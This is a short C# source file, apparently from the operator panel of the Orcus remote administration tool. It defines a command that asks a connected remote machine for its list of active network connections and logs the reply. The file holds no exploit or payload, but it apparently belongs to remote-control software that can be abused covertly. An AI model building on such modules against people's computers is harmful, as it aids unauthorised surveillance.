using System;
using System.Collections.Generic;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.ActiveConnections;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.ActiveConnections
{
    public class ActiveConnectionsCommand : Command
    {
        public event EventHandler<List<ActiveConnection>> ConnectionsReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            var serializer = new Serializer(typeof (List<ActiveConnection>));
            ConnectionsReceived?.Invoke(this, serializer.Deserialize<List<ActiveConnection>>(parameter));
            LogService.Receive((string) Application.Current.Resources["ActiveConnectionsReceived"]);
        }

        public void GetActiveConnections()
        {
            ConnectionInfo.SendCommand(this, new byte[0]);
            LogService.Send((string) Application.Current.Resources["ReceiveActiveConnections"]);
        }

        public override string DescribePackage(byte[] data, bool isReceived)
        {
            return isReceived ? "ResponseActiveConnections" : "GetActiveConnections";
        }

        protected override uint GetId()
        {
            return 0;
        }
    }
}